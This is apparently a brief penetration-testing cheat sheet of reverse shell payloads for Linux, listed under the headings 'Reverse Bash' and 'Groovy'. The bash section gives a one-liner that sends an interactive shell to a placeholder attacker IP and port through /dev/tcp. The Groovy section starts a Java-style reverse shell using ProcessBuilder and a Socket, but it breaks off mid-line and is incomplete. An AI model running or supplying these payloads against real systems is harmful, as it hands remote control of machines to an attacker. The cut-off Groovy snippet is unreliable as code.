# Linux

## Reverse Bash

```bash
sh -i >& /dev/tcp/<AttackerIP>/<Port> 0>&1
```

## Groovy

NOTE: Java reverse shell also work for Groovy

```bash
String host="localhost";
int port=8044;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(h
```
